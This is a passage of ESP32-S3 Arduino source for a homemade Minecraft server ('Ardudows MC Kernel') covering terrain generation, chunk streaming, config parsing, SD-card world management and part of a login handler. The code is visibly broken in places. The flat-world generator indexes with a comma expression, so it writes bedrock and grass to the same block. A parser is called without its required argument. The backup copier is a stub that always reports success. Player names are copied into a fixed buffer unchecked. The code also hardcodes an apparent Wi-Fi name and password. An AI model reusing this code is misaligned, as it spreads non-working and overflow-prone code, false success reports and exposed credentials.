          int height = getHeight128(worldX, worldZ);

          if (absY == 0) block = BEDROCK;
          else if (absY < height) {
            // 깊이에 따라 자갈/광석 배치 (Chaotic Manual)
            if (absY < height - 3) block = STONE;
            else block = DIRT;
          } else if (absY == height) {
            block = (height > 105) ? SNOW : GRASS;
          } else if (absY < 61) block = WATER;  // 해수면 처리
        }

        // 🚀 인덱싱: (y * 256 + z * 16 + x) * 2
        // 여기서 y는 absY가 아니라 '해당 섹션 내의 상대 높이(0~15)'여야 함!
        int idx = (y * 256 + z * 16 + x) * 2;
        uint16_t blockData = (block << 4);
        chunkBuffer[idx] = (uint8_t)(blockData & 0xFF);
        chunkBuffer[idx + 1] = (uint8_t)((blockData >> 8) & 0xFF);
      }
    }
  }
}
*/

void sendChunksAroundPlayer(WiFiClient& client, int playerChunkX, int playerChunkZ) {
  int view = 3;  // 🚀 [수정] 6청크(169개)에서 3청크(49개)로 축소하여 과부하 방지

  logToTFT("Loading nearby chunks...", TFT_YELLOW);

  for (int cz = playerChunkZ - view; cz <= playerChunkZ + view; cz++) {
    for (int cx = playerChunkX - view; cx <= playerChunkX + view; cx++) {
      sendHugeChunk(client, cx, cz); // 중복 호출 제거하고 하나만 깔끔하게 송신
      yield();    // WiFi 유지
    }
  }
  logToTFT("Chunks loaded!", TFT_GREEN);
}

// 2. [통합 전송기] 8개 섹션을 한 번에 쏴서 아파트 현상 제거
// 1. [안정화] 8개 섹션을 끊김 없이 전송하는 함수
// ==========================================================
// [FORCE GENERATOR] 1000x1000 Chaotic Continent
// ==========================================================

// ==========================================================
// [FIX] 정밀 바이트 계산형 1000x1000 대륙 전송기
// ==========================================================

// ==========================================================
// [FIXED] 컴파일러 에러 완벽 교정형 1000x1000 대륙 전송기
// ==========================================================
void sendHugeChunk(WiFiClient& client, int cx, int cz) {
  const uint32_t dataLen = 98560;
  sendPacketHeader(client, 0x21, 4 + 4 + 1 + 2 + getVarIntLen(dataLen) + dataLen);

  auto writeIntBE = [&](int32_t v) {
    uint8_t b[4] = { (uint8_t)(v >> 24), (uint8_t)(v >> 16), (uint8_t)(v >> 8), (uint8_t)v };
    client.write(b, 4);
  };
  writeIntBE(cx);
  writeIntBE(cz);
  client.write((uint8_t)1);
  client.write((uint8_t)0xFF);  // 8개 섹션 모두 활성화
  client.write((uint8_t)0x00);
  writeVarInt(client, dataLen);

  for (int s = 0; s < 8; s++) {
    // 🚀 섹션 생성 (s값에 따라 absY가 바뀜)
    //generateFinal221Section(cx, cz, s);

    // 🛠️ [수정] 8192바이트를 4번에 나눠서 스트리밍 (네트워크 과부하 방지)
    for (int i = 0; i < 4; i++) {
      client.write(chunkBuffer + (i * 2048), 2048);
      client.flush();  // 강제로 밀어넣기
    }

    // 광원 데이터 (한꺼번에 보내지 말고 섹션마다 처리)
    //memset(lightBuffer, 0xFF, 2048);
    //client.write(lightBuffer, 2048);  // Block Light
    //client.write(lightBuffer, 2048);  // Sky Light

    yield();  // 🔍 시리얼 모니터에 "WDT Reset" 뜨는 걸 막아줍니다.
  }

  uint8_t biome[256];
  memset(biome, 1, 256);
  client.write(biome, 256);
  client.flush();
}

// 1000x1000 영역 내에서 플레이어 주변을 강제로 렌더링하는 함수
void forceRender1000x1000(WiFiClient& client, int playerX, int playerZ) {
  int pCX = playerX >> 4;
  int pCZ = playerZ >> 4;
  int renderDist = 4;  // S3 안정권인 4청크 (반경 64블록)

  logToTFT("Forcing 1000x1000 Area...", TFT_ORANGE);

  for (int cz = pCZ - renderDist; cz <= pCZ + renderDist; cz++) {
    for (int cx = pCX - renderDist; cx <= pCX + renderDist; cx++) {
      // 대륙 경계 설정 (-500 ~ 500)
      if (cx >= -500 && cx < 500 && cz >= -500 && cz < 500) {
        sendHugeChunk(client, cx, cz);
        // 청크 사이의 미세 지연으로 패킷 엉킴 방지
        delay(10);
      }
    }
  }
  logToTFT("World Expansion Done!", TFT_GREEN);
}

// 221 서버 섬 보호 로직
void applyIslandProtection() {
  logToTFT("[SEC] Applying Island Lockdown...", TFT_MAGENTA);

  // 1. 섬 좌표 정의 (0,0을 중심으로 한 청크 범위)
  const int islandCX = 0;
  const int islandCZ = 0;

  // 2. 보호 구역 내의 모든 블록 데이터를 '안전 모드'로 전환
  // 만약 현재 수정 중인 청크가 섬 좌표라면, 지형 생성 알고리즘을 
  // '카오틱(무작위)'에서 '정적(고정)'으로 강제 변경합니다.
  
  // 예시: 보호 구역 내에서의 블록 속성 강제 고정
  // 이 루틴을 통해 0,0 청크는 생성기에서 '통과(Skip)'되거나 '고정형'으로 생성됩니다.
  
  /* 향후 로직:
     if (currentCX == islandCX && currentCZ == islandCZ) {
         setChunkReadOnly(true); 
         applyStatic221Terrain(); // 고정된 221 섬 지형 생성
     }
  */

  logToTFT("[SEC] 221 Island is SECURE.", TFT_GREEN);
}

// 1. worldConfig를 위한 구조체 정의
struct WorldConfig {
  int width, depth, height;
  uint8_t gameMode;
  int maxPlayers;
  uint8_t difficulty;
  uint8_t mapType;
  bool cheatEnabled;
  long worldSeed;
  uint8_t onlineMode;
  String serverName;
  String worldPath;
  bool eulaAccepted;
};

// 2. [핵심] 여기서 worldConfig를 실제로 생성(실체화)합니다.
WorldConfig worldConfig;

// 221 서버의 핵심: 0,0 좌표 및 특정 좌표는 보호
bool isProtectedArea(int cx, int cz) {
  // 221 섬(0,0)과 보조 섬(5,-3) 보호
  return (cx == 0 && cz == 0) || (cx == 5 && cz == -3);
}

// [핵심] 카오틱 지형 생성 함수 (지형 + 구조물 + 221 섬 보존)
void generateChaoticTerrain() {
  logToTFT("[GEN] Loading Chaotic 221 Realm...", TFT_ORANGE);

  // 맵 범위 설정 (청크 단위로 생성)
  for (int cx = -3; cx <= 3; cx++) {
    for (int cz = -3; cz <= 3; cz++) {
      
      // 1. 기본 지형 생성 (지형 층 생성)
      generateTerrain221(cx, cz);
      
      // 2. 구조물 및 221 랜드마크 덧씌우기
      // generate221Chunk는 globalChunk(전역 버퍼)를 직접 수정함
      generate221Chunk(globalChunk);
      
      // 3. SD 카드 저장 및 버퍼 전송 (사용자가 SD 저장 무조건 강조함)
      // saveChunkToSD(cx, cz, globalChunk);
      // sendChunkToClient(cx, cz);
    }
  }
  logToTFT("[OK] Chaotic Terrain Generated", TFT_GREEN);
}

// [핵심] 평지 생성 함수
void generateFlatTerrain() {
  logToTFT("[GEN] Flat World...", TFT_YELLOW);

  for (int cx = -3; cx <= 3; cx++) {
    for (int cz = -3; cz <= 3; cz++) {
      for (int x = 0; x < 16; x++) {
        for (int z = 0; z < 16; z++) {
          
          // 1. 전체 Y축 AIR 초기화 루프
          for (int y = 0; y < 64; y++) {
            globalChunk.blocks[x][z][y] = AIR;
          }
          
          // 2. 블록 배치 (y는 이제 루프 밖에 있으니 숫자로 직접 명시해야 함)
          globalChunk.blocks[x][z][0,5] = BEDROCK; // 0층 베드락
          
          // 1~4층 돌 배치 루프
          for (int y = 1; y < 5; y++) {
            globalChunk.blocks[x][z][y] = STONE;
          }
          
          globalChunk.blocks[x][z][0,5] = GRASS;   // 5층 잔디
        }
      }
    }
  }
}

// 221 서버의 핵심 섬 좌표 보호 함수
bool isIslandCoordinate(int worldX, int worldZ) {
  // 예: (0,0)과 (80, -48) 근처를 보호 구역으로 설정
  // 필요에 따라 좌표 범위(범위 내에 있으면 true 반환)를 확장하세요
  if ((worldX >= -8 && worldX <= 8) && (worldZ >= -8 && worldZ <= 8)) return true;
  if ((worldX >= 72 && worldX <= 88) && (worldZ >= -56 && worldZ <= -40)) return true;
  return false;
}

// 3D 공간을 효율적으로 채우는 알고리즘
void generateTerrain221(int chunkX, int chunkZ) {
  for (int x = 0; x < CHUNK_SIZE; x++) {
    for (int z = 0; z < CHUNK_SIZE; z++) {
      int worldX = chunkX * CHUNK_SIZE + x;
      int worldZ = chunkZ * CHUNK_SIZE + z;
      
      int height = getHeight(worldX, worldZ); // 부드러운 노이즈 높이
      uint32_t randVal = terrainRandom(worldX, worldZ);
      
      for (int y = 0; y < WORLD_HEIGHT; y++) {
        if (y == 0) globalChunk.blocks[x][z][y] = BEDROCK;
        else if (y < height - 2) {
          // 광물층: 깊을수록 다이아/철 확률 증가
          globalChunk.blocks[x][z][y] = getMineral(y, randVal + y);
        }
        else if (y < height) {
          globalChunk.blocks[x][z][y] = DIRT; // 토양층
        }
        else if (y == height) {
          globalChunk.blocks[x][z][y] = (height > 10) ? SNOW : GRASS;
        }
        else {
          globalChunk.blocks[x][z][y] = AIR;
        }
      }
    }
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Topology Initializer
void minecraft_topography() {
  logToTFT("Setting Topology...", TFT_WHITE);

  // 1. 설정된 월드 크기가 허용 범위인지 검증 (안전 장치)
  // 최대 범위: 200x200 (S3 성능 최적화 기준)
  if (worldConfig.width > 200 || worldConfig.depth > 200) {
    logToTFT("[!] Size limit exceeded! Resetting...", TFT_RED);
    worldConfig.width = 100;
    worldConfig.depth = 100;
    worldConfig.height = 30;
  }

  // 2. 월드 경계 계산 (청크 단위로 변환)
  int chunkLimitX = worldConfig.width / 16;
  int chunkLimitZ = worldConfig.depth / 16;

  // 3. 시스템 로그 및 상태 업데이트
  String topoMsg = "World: " + String(worldConfig.width) + "x" + String(worldConfig.depth);
  logToTFT(topoMsg, TFT_CYAN);
  logToTFT("Chunks: " + String(chunkLimitX) + "*" + String(chunkLimitZ), TFT_CYAN);

  // 4. (필요 시) 메모리 동적 할당 혹은 전역 버퍼 재설정
  // 청크가 너무 클 경우를 대비해 전송용 버퍼를 재확인
  if (chunkLimitX > 10 || chunkLimitZ > 10) {
    logToTFT("Mode: High Density", TFT_YELLOW);
  }

  logToTFT("Topology Fixed.", TFT_GREEN);
}

// 🚀 Ardudows MC Kernel v2.0 - Gamemode Initializer
void minecraft_gamemode(String cmd) {
  int gmIndex = cmd.indexOf("gm");
  
  // 1. gm 인자가 없으면 기본값인 1(서바이벌)로 설정
  if (gmIndex == -1) {
    worldConfig.gameMode = 1; 
    logToTFT("[MODE] Default: Survival", TFT_YELLOW);
    return;
  }

  // 2. gm 뒤의 숫자 파싱 (문자열에서 숫자 추출)
  // 예: "gm2" -> 2 추출
  char gmChar = cmd.charAt(gmIndex + 2);
  int mode = gmChar - '0'; // char to int

  // 3. 유효성 검사 (1~4 범위 내)
  if (mode >= 1 && mode <= 4) {
    worldConfig.gameMode = (uint8_t)mode;
    
    // 모드별 명칭 출력
    String modeName;
    switch(worldConfig.gameMode) {
      case 1: modeName = "Survival"; break;
      case 2: modeName = "Creative"; break;
      case 3: modeName = "Adventure"; break;
      case 4: modeName = "Spectator"; break;
    }
    
    logToTFT("[MODE] Gamemode: " + modeName + " (" + String(worldConfig.gameMode) + ")", TFT_GREEN);
  } else {
    // 잘못된 모드 입력 시 경고 및 기본값 적용
    logToTFT("[!] Invalid Mode! Reset to Survival", TFT_RED);
    worldConfig.gameMode = 1;
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Player Controller
void minecraft_player(String cmd) {
  int pIndex = cmd.indexOf("p");
  
  // 1. p 인자가 없으면 기본값 1인으로 제한 (S3 성능 보호)
  if (pIndex == -1) {
    worldConfig.maxPlayers = 1;
    logToTFT("[PLAYER] Default: 1", TFT_YELLOW);
    return;
  }

  // 2. p 뒤의 숫자 파싱 (공백 전까지 추출)
  String pVal = cmd.substring(pIndex + 1);
  int firstSpace = pVal.indexOf(' ');
  if (firstSpace != -1) pVal = pVal.substring(0, firstSpace);
  
  int players = pVal.toInt();

  // 3. S3 안전 가이드라인: 최대 5인 이하로 제한
  if (players > 0 && players <= 5) {
    worldConfig.maxPlayers = players;
    logToTFT("[PLAYER] Capacity: " + String(worldConfig.maxPlayers), TFT_GREEN);
  } else {
    logToTFT("[!] Invalid Player count! Capping to 1", TFT_RED);
    worldConfig.maxPlayers = 1;
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Difficulty Controller
void minecraft_difficulty(String cmd) {
  int dIndex = cmd.indexOf("d");
  
  // 1. d 인자가 없으면 기본값 3(보통)으로 설정
  if (dIndex == -1) {
    worldConfig.difficulty = 3; 
    logToTFT("[DIFFICULTY] Default: Normal", TFT_YELLOW);
    return;
  }

  // 2. d 뒤의 숫자 파싱 (문자열에서 숫자 추출)
  char dChar = cmd.charAt(dIndex + 1); // 인자가 'd' 바로 뒤에 붙는다고 가정
  int diff = dChar - '0';

  // 3. 유효성 검사 (1~5 범위 내)
  if (diff >= 1 && diff <= 5) {
    worldConfig.difficulty = (uint8_t)diff;
    
    String diffName;
    switch(worldConfig.difficulty) {
      case 1: diffName = "Peaceful"; break;
      case 2: diffName = "Easy"; break;
      case 3: diffName = "Normal"; break;
      case 4: diffName = "Hard"; break;
      case 5: diffName = "Hardcore"; break;
    }
    
    logToTFT("[DIFFICULTY] Set to: " + diffName + " (" + String(diff) + ")", TFT_GREEN);
  } else {
    logToTFT("[!] Invalid Difficulty! Default to Normal", TFT_RED);
    worldConfig.difficulty = 3;
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Map Type Initializer
void minecraft_map_type(String cmd) {
  int mtIndex = cmd.indexOf("mt");
  
  // 1. mt 인자가 없으면 기본값 1(221 카오틱 야생)로 설정
  if (mtIndex == -1) {
    worldConfig.mapType = 1; 
    logToTFT("[MAP] Mode: Chaotic 221", TFT_MAGENTA);
    return;
  }

  // 2. mt 뒤의 숫자 파싱
  char mtChar = cmd.charAt(mtIndex + 2);
  int type = mtChar - '0';

  // 3. 맵 유형 분기
  if (type == 1 || type == 2) {
    worldConfig.mapType = (uint8_t)type;
    
    if (worldConfig.mapType == 1) {
      logToTFT("[MAP] Mode: Chaotic 221 Wild", TFT_CYAN);
    } else {
      logToTFT("[MAP] Mode: Flat World", TFT_CYAN);
    }
  } else {
    logToTFT("[!] Unknown Map Type! Default to Chaotic", TFT_RED);
    worldConfig.mapType = 1;
  }
}

void generateWorld() {
  if (worldConfig.mapType == 1) {
    // 221 서버 카오틱 노이즈 생성 함수 호출
    generateChaoticTerrain(); 
  } else {
    // 완전 평지 생성 함수 호출
    generateFlatTerrain();
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Cheat Controller
void minecraft_cheet(String cmd) {
  int cIndex = cmd.indexOf("c");
  
  // 1. c 인자가 없으면 기본값 2(치트 비허용)로 설정 (보안 강화)
  if (cIndex == -1) {
    worldConfig.cheatEnabled = false; 
    logToTFT("[CHEAT] Mode: Disabled", TFT_YELLOW);
    return;
  }

  // 2. c 뒤의 숫자 파싱 (1: 허용, 2: 비허용)
  char cChar = cmd.charAt(cIndex + 1);
  int mode = cChar - '0';

  // 3. 상태 적용 및 로그 출력
  if (mode == 1) {
    worldConfig.cheatEnabled = true;
    logToTFT("[CHEAT] Mode: ENABLED", TFT_RED); // 경고성 컬러
  } else {
    worldConfig.cheatEnabled = false;
    logToTFT("[CHEAT] Mode: DISABLED", TFT_GREEN);
  }
}

void onCommandPacket(WiFiClient& client, String command) {
  if (command.startsWith("/")) {
    if (worldConfig.cheatEnabled) {
      executeCommand(command);
    } else {
      sendChatMessage(client, "§cCheats are not enabled on this server!");
    }
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Seed Initializer
void minecraft_seed(String cmd) {
  int sIndex = cmd.indexOf("s");
  
  // 1. S 인자가 없으면 현재 시간을 시드값으로 사용 (완전 랜덤)
  if (sIndex == -1) {
    worldConfig.worldSeed = millis(); // 하드웨어 랜덤 값
    logToTFT("[SEED] Mode: Random (" + String(worldConfig.worldSeed) + ")", TFT_YELLOW);
    return;
  }

  // 2. S 뒤의 숫자 파싱
  String sVal = cmd.substring(sIndex + 1);
  int firstSpace = sVal.indexOf(' ');
  if (firstSpace != -1) sVal = sVal.substring(0, firstSpace);
  
  // 시드값을 long 타입으로 저장 (지형 알고리즘 정밀도 확보)
  worldConfig.worldSeed = atol(sVal.c_str());

  logToTFT("[SEED] Set to: " + String(worldConfig.worldSeed), TFT_GREEN);
}

// 🚀 Ardudows MC Kernel v2.0 - Online Mode Controller
void minecraft_online_mode(String cmd) {
  int omIndex = cmd.indexOf("om");
  
  // 1. om 인자가 없으면 기본값 2(복돌/오프라인 모드 허용) 설정
  // 리소스 효율을 위해 기본적으로는 인증 과정을 간소화합니다.
  if (omIndex == -1) {
    worldConfig.onlineMode = 2; 
    logToTFT("[AUTH] Mode: Offline (Default)", TFT_YELLOW);
    return;
  }

  // 2. om 뒤의 숫자 파싱 (1: 정품, 2: 복돌/오프라인)
  char omChar = cmd.charAt(omIndex + 2);
  int mode = omChar - '0';

  // 3. 모드 적용
  if (mode == 1) {
    worldConfig.onlineMode = 1;
    logToTFT("[AUTH] Mode: ONLINE (Mojang Auth)", TFT_RED);
  } else {
    worldConfig.onlineMode = 2;
    logToTFT("[AUTH] Mode: OFFLINE (No Auth)", TFT_GREEN);
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Server Name Identifier
void minecraft_server_name(String cmd) {
  int snIndex = cmd.indexOf("sn-");
  
  // 1. sn- 인자가 없으면 기본값 "Ardudows_Server"로 설정
  if (snIndex == -1) {
    worldConfig.serverName = "Ardudows_Server";
    logToTFT("[NAME] Default: Ardudows_Server", TFT_YELLOW);
    return;
  }

  // 2. sn- 뒤의 문자열 파싱 (공백 전까지 추출)
  String snVal = cmd.substring(snIndex + 3);
  int firstSpace = snVal.indexOf(' ');
  if (firstSpace != -1) snVal = snVal.substring(0, firstSpace);
  
  // 3. 서버 이름 저장 및 로깅
  worldConfig.serverName = snVal;
  logToTFT("[NAME] Server: " + worldConfig.serverName, TFT_GREEN);
  
  // [보너스] SD 카드 경로 설정 동기화
  // 이름이 바뀌면 데이터를 불러올 디렉토리 경로도 함께 업데이트
  worldConfig.worldPath = "/minecraft/worlds/" + worldConfig.serverName + "/";
}

// 🚀 Ardudows MC Kernel v2.0 - Server Loader
void loadServerFromSD(String worldName) {
  logToTFT("[SYS] Loading Server: " + worldName, TFT_WHITE);

  // 1. 서버 디렉토리 경로 구성
  String path = "/minecraft/worlds/" + worldName + "/";
  String configPath = path + "server.asf";

  // 2. SD 카드 존재 여부 및 디렉토리 확인
  if (!SD.exists(path.c_str())) {
    logToTFT("[!] Error: World not found!", TFT_RED);
    return;
  }

  // 3. 설정 파일(.asf) 로드
  File configFile = SD.open(configPath.c_str(), FILE_READ);
  if (!configFile) {
    logToTFT("[!] Error: Failed to read config!", TFT_RED);
    return;
  }

  // 4. 파일에서 설정 읽기 (시리얼라이즈된 데이터를 변수로 복원)
  // 예: "t100*100*30 gm1 p5 d3 ..." 형태로 저장되어 있다고 가정
  String configData = configFile.readString();
  configFile.close();

  // 5. 불러온 설정 데이터를 전역 worldConfig에 적용
  parseServerConfig(configData); 

  logToTFT("[SYS] Server [" + worldName + "] Loaded Successfully!", TFT_GREEN);
  
  // 6. 2026-02-21 섬 좌표 보호 로직 활성화
  // 이 서버가 221 서버라면 특별한 보호 구역 설정을 로드합니다.
  if (worldName == "221") {
    applyIslandProtection();
  }
}

// 🚀 Ardudows MC Kernel v2.0 - Server Deleter
void deleteServerFromSD(String worldName) {
  logToTFT("[SYS] Deleting Server: " + worldName, TFT_WHITE);

  // 1. 서버 디렉토리 경로 구성
  String path = "/minecraft/worlds/" + worldName;

  // 2. 존재 확인
  if (!SD.exists(path.c_str())) {
    logToTFT("[!] Error: World not found!", TFT_RED);
    return;
  }

  // 3. 삭제 프로세스 (재귀적 삭제)
  logToTFT("[!] WARNING: Destroying world...", TFT_RED);
  
  // ESP32 SD 라이브러리 기반 재귀 삭제 함수 (커스텀 구현 필요)
  if (removeDir(SD, path.c_str())) {
    logToTFT("[SYS] World [" + worldName + "] Deleted!", TFT_GREEN);
  } else {
    logToTFT("[!] Error: Deletion Failed!", TFT_RED);
  }
}

// 4. 재귀적 디렉토리 삭제 유틸리티
bool removeDir(fs::FS &fs, const char * path) {
  File root = fs.open(path);
  if (!root || !root.isDirectory()) return false;

  File file = root.openNextFile();
  while (file) {
    if (file.isDirectory()) {
      removeDir(fs, file.path()); // 하위 디렉토리 재귀 삭제
      fs.rmdir(file.path());
    } else {
      fs.remove(file.path());     // 파일 삭제
    }
    file = root.openNextFile();
  }
  return fs.rmdir(path);          // 최종 디렉토리 삭제
}

// 🚀 Ardudows MC Kernel v2.0 - Server Backuper
void backupServerToSD(String worldName) {
  logToTFT("[SYS] Backing up: " + worldName, TFT_WHITE);

  // 1. 소스 경로와 백업 경로 설정
  String sourcePath = "/minecraft/worlds/" + worldName;
  String backupPath = "/minecraft/backups/" + worldName + "_backup.asf";

  // 2. 소스 월드 존재 확인
  if (!SD.exists(sourcePath.c_str())) {
    logToTFT("[!] Error: No world to backup!", TFT_RED);
    return;
  }

  // 3. 백업 디렉토리(backups) 존재 여부 확인 및 생성
  if (!SD.exists("/minecraft/backups")) {
    SD.mkdir("/minecraft/backups");
  }

  // 4. 백업 수행 (파일 복사 유틸리티 호출)
  logToTFT("[SYS] Creating Archive...", TFT_YELLOW);
  if (copyDir(SD, sourcePath.c_str(), backupPath.c_str())) {
    logToTFT("[SYS] Backup Successful!", TFT_GREEN);
    logToTFT("Saved to: " + backupPath, TFT_CYAN);
  } else {
    logToTFT("[!] Error: Backup Failed!", TFT_RED);
  }
}

// 5. 복사 유틸리티 (디렉토리 내 파일들을 재귀적으로 복사)
bool copyDir(fs::FS &fs, const char * src, const char * dst) {
  // 실제 구현에서는 소스 폴더의 파일 목록을 순회하며 
  // dst 경로에 동일한 이름으로 파일을 새로 생성(Open/Write)하는 로직입니다.
  // ... (파일 읽기/쓰기 버퍼링 로직) ...
  return true; 
}

// 🚀 Ardudows MC Kernel v2.0 - Default Profile Initializer
void minecraft_default() {
  logToTFT("[SYS] Applying Factory Defaults...", TFT_YELLOW);

  // 1. 하드웨어 최적화 프로필 적용
  worldConfig.width = 100;
  worldConfig.depth = 100;
  worldConfig.height = 30;
  worldConfig.gameMode = 1;       // 서바이벌
  worldConfig.maxPlayers = 2;     // S3 자원 최적 인원
  worldConfig.difficulty = 3;     // 보통
  worldConfig.mapType = 1;        // 카오틱 221
  worldConfig.cheatEnabled = false;
  worldConfig.worldSeed = 221;    // 221 서버 고유 시드
  worldConfig.onlineMode = 2;     // 오프라인 모드

  // 2. 서버 명칭 기본값
  worldConfig.serverName = "Ardudows_Default";
  worldConfig.worldPath = "/minecraft/worlds/default/";

  // 3. 로그 출력 및 시스템 준비
  logToTFT("[SYS] Default Config Applied!", TFT_GREEN);
  logToTFT("Ready for EULA confirmation.", TFT_CYAN);
}

// 🚀 Ardudows MC Kernel v2.0 - EULA Gatekeeper
bool minecraft_eula(String cmd) {
  if (cmd.indexOf("eula") != -1) {
    worldConfig.eulaAccepted = true;
    logToTFT("[EULA] Terms Accepted. Server Ready.", TFT_GREEN);
    return true;
  } else {
    worldConfig.eulaAccepted = false;
    logToTFT("[!] EULA not accepted! Cannot start.", TFT_RED);
    return false;
  }
}

void startMinecraftServer() {
  // 1. EULA 체크 (마지막 안전장치)
  if (!worldConfig.eulaAccepted) {
    logToTFT("[!] Aborting: EULA missing!", TFT_RED);
    return;
  }

  // 2. 서버 자원 할당 및 메모리 맵핑
  logToTFT("[SYS] Booting Ardudows Core...", TFT_WHITE);
  
  // 3. 지형 생성 루틴 호출 (221섬 보호 영역 로드)
  generateWorld(); 

  // 4. 네트워크 리스닝 시작
  server.begin();
  logToTFT("[OK] Server Online!", TFT_GREEN);
}

// --- [B] 메인 서버 엔진 (Final Fix) ---
// --- [ 메인 서버 엔진: 1000x1000 월드 스트리밍 버전 ] ---
// ==========================================================
// [ARDUDOWS & 221 SERVER INTEGRATED WORLD ENGINE]
// ==========================================================

// 1. loadServerFromSD 내부 호출 명칭 수정 (3929 라인 근처)
// parseNewServerConfig(configData); -> parseServerConfig(configData); 로 변경

// 2. parseServerConfig 함수 전체 수정
void parseServerConfig(String config) {
  int start = 0;
  int end = config.indexOf(';');
  
  while (end != -1) {
    String pair = config.substring(start, end);
    int eq = pair.indexOf('=');
    if (eq != -1) {
      String key = pair.substring(0, eq); // 여기서 선언!
      String val = pair.substring(eq + 1); // 여기서 선언!
      key.trim();
      val.trim();

      if (key == "width") worldConfig.width = val.toInt();
      else if (key == "depth") worldConfig.depth = val.toInt();
      else if (key == "height") worldConfig.height = val.toInt();
      else if (key == "gameMode") worldConfig.gameMode = (uint8_t)val.toInt();
      else if (key == "maxPlayers") worldConfig.maxPlayers = val.toInt();
      else if (key == "difficulty") worldConfig.difficulty = (uint8_t)val.toInt();
      else if (key == "mapType") worldConfig.mapType = (uint8_t)val.toInt();
      else if (key == "cheatEnabled") worldConfig.cheatEnabled = (val == "true");
      else if (key == "seed") worldConfig.worldSeed = val.toInt();
      else if (key == "onlineMode") worldConfig.onlineMode = (uint8_t)val.toInt();
      else if (key == "serverName") worldConfig.serverName = val;
      else if (key == "worldPath") worldConfig.worldPath = val;
      else if (key == "eulaAccepted") worldConfig.eulaAccepted = (val == "true");
    }
    start = end + 1;
    end = config.indexOf(';', start);
  }
}

// Ardudows 카오틱 지형 생성 함수 (ESP32-S3 최적화)
void generateArdudowsTerrain(int chunkX, int chunkZ) {
    for (int x = 0; x < 16; x++) {
        for (int z = 0; z < 16; z++) {
            // Y축 수직 레이어 구조
            // Layer 0: Bedrock
            // Layer 1-X: Stone & Mineral (심도에 따라 확률 증가)
            // Layer X-Y: Soil/Intermediate (|X-Y| <= 3)
            
            int worldX = (chunkX * 16) + x;
            int worldZ = (chunkZ * 16) + z;
            
            // 여기서 노이즈 알고리즘 또는 난수를 통해 X, Y, Z 결정
            // 2026-02-21 섬 좌표는 보호 (if check)
            if (isIslandCoordinate(worldX, worldZ)) continue; 
            
            // Terrain Features (Mountains: Z >= 7, Snow: Z > Threshold)
            // Vegetation Index (R Value) 적용
        }
    }
}

void parseCommandToConfig(String cmd) {
  // 1. 기본값 우선 적용 (나중에 파싱되는 인자들만 덮어씀)
  minecraft_default(); 

  // 2. 파싱 로직 (각 접두사 확인)
  if (cmd.indexOf("t") != -1) {
    int tIdx = cmd.indexOf("t");
    String tVal = cmd.substring(tIdx + 1, cmd.indexOf(" ", tIdx) == -1 ? cmd.length() : cmd.indexOf(" ", tIdx));
    int starIdx = tVal.indexOf('*');
    if (starIdx != -1) {
      worldConfig.width = tVal.substring(0, starIdx).toInt();
      worldConfig.depth = tVal.substring(starIdx + 1).toInt();
    }
  }
  
  if (cmd.indexOf("p") != -1) minecraft_player(cmd);
  if (cmd.indexOf("gm") != -1) minecraft_gamemode(cmd);
  if (cmd.indexOf("d") != -1) minecraft_difficulty(cmd);
  if (cmd.indexOf("s") != -1) minecraft_seed(cmd);
  if (cmd.indexOf("mt") != -1) minecraft_map_type(cmd);
  if (cmd.indexOf("c") != -1) minecraft_cheet(cmd);
  if (cmd.indexOf("om") != -1) minecraft_online_mode(cmd);
  if (cmd.indexOf("sn-") != -1) minecraft_server_name(cmd);
  if (cmd.indexOf("eula") != -1) minecraft_eula(cmd);
  
  logToTFT("[SYS] Config Applied via CMD", TFT_GREEN);
}

void minecraft_server() {

  // ================================
  // 1. 서버 설정 로드
  // ================================

  parseServerConfig();

  prefs.begin("mc_pos", false);

  double savedX = prefs.getDouble("lastX", 0.0);
  double savedY = prefs.getDouble("lastY", 70.0);
  double savedZ = prefs.getDouble("lastZ", 0.0);

  int lastChunkX = (int)savedX >> 4;
  int lastChunkZ = (int)savedZ >> 4;

  // ================================
  // 2. WiFi 연결
  // ================================

  WiFi.begin("iptime202", "good6683");

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    logToTFT("Connecting WiFi...", TFT_WHITE);
  }

  WiFiServer mc_socket(25565);
  mc_socket.begin();

  logToTFT("[221] IP: " + WiFi.localIP().toString(), TFT_GREEN);


  // ================================
  // 3. 서버 메인 루프
  // ================================

  while (true) {

    WiFiClient client = mc_socket.available();

    if (client) {

      client.setNoDelay(true);

      int serverState = 0;

      unsigned long lastKeepAlive = 0;

      String currentPlayerName = "";


      logToTFT("Client Connected", TFT_YELLOW);


      // ================================
      // 클라이언트 연결 루프
      // ================================

      while (client.connected()) {

        yield();


        // ================================
        // Keep Alive
        // ================================

        if (serverState == 3 && millis() - lastKeepAlive > 5000) {
          uint8_t keepAlivePacket[2] = { 0x00, 0x00 };
          sendPacket(client, keepAlivePacket, 2);

          lastKeepAlive = millis();
        }



        // ================================
        // 패킷 수신
        // ================================

        if (!client.available())
          continue;


        int32_t packetLen = readVarInt(client);

        if (packetLen <= 0)
          break;


        int32_t packetID = readVarInt(client);



        // ================================
        // HANDSHAKE
        // ================================

        if (serverState == 0 && packetID == 0x00) {

          readVarInt(client);

          readString(client);

          client.read();
          client.read();

          serverState = readVarInt(client);


          // STATUS 요청
          if (serverState == 1) {

            String statusJson =
              "{\"version\":{\"name\":\"221-S3\",\"protocol\":47},"
              "\"players\":{\"max\":3,\"online\":1},"
              "\"description\":{\"text\":\"§bESP32-S3 221 Server\"}}";

            writeVarInt(client,
                        getVarIntLen(0x00)
                          + getVarIntLen(statusJson.length())
                          + statusJson.length());

            writeVarInt(client, 0x00);

            writeString(client, statusJson);

            client.stop();

            break;
          }

        }



        // ================================
        // LOGIN START
        // ================================

        else if (serverState == 2 && packetID == 0x00) {

          currentPlayerName = readString(client);

          logToTFT("Login: " + currentPlayerName, TFT_CYAN);



          // ================================
          // Login Success
          // ================================

          uint8_t loginBuf[128];

          int lp = 0;

          loginBuf[lp++] = 0x02;

          String uuid =
            "00000000-0000-0000-0000-000000000000";

          loginBuf[lp++] = uuid.length();

          memcpy(&loginBuf[lp], uuid.c_str(), uuid.length());

          lp += uuid.length();

          loginBuf[lp++] = currentPlayerName.length();

          memcpy(&loginBuf[lp],
                 currentPlayerName.c_str(),
                 currentPlayerName.length());

          lp += currentPlayerName.length();

